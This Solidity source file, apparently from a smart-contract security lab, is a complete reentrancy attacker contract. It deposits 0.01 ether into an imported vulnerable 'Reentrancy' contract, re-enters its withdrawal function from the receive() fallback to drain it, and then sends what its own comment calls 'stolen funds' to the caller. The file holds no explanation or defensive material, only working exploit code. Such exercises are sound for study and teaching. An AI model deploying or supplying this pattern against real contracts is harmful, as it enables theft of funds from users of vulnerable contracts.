// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./Reentrancy.sol";

contract ReentrancyExplorer {
    Reentrancy immutable targetContract;

    constructor(address targetContract_) {
        targetContract = Reentrancy(targetContract_);
    }

    function firstStep() external payable {
        require(msg.value == 0.01 ether, "invalid amount");
        targetContract.deposit{value: msg.value}();
    }

    function secondStep() public {
        if (gasleft() > 2300) {
            targetContract.withdrawWithReentrancy(0.01 ether);
        }
    }

    receive() external payable {
        secondStep();
    }

    // after attack finished the exploiter will withdraw stolen funds
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
